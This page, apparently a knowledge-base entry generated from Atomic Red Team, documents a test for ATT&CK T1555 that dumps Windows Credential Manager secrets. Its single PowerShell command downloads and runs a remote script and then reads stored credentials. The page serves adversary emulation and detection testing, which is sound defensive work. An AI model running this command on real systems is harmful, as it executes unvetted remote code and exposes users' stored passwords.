---
atomic_guid: "c89becbe-1758-4e7d-a0f4-97d2188a23e3"
title: "Dump credentials from Windows Credential Manager With PowerShell [windows Credentials]"
framework: "atomic"
generated: "true"
attack_technique_id: "T1555"
attack_technique_name: "Credentials from Password Stores"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555/T1555.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "c89becbe-1758-4e7d-a0f4-97d2188a23e3"
  - "Dump credentials from Windows Credential Manager With PowerShell [windows Credentials]"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Dump credentials from Windows Credential Manager With PowerShell [windows Credentials]

This module will extract the credentials from Windows Credential Manager

## Metadata

- Atomic GUID: c89becbe-1758-4e7d-a0f4-97d2188a23e3
- Technique: T1555: Credentials from Password Stores
- Platforms: windows
- Executor: powershell
- Elevation Required: False
- Source Path: atomics/T1555/T1555.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1555-credentials_from_password_stores|T1555]]

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555/T1555.yaml)
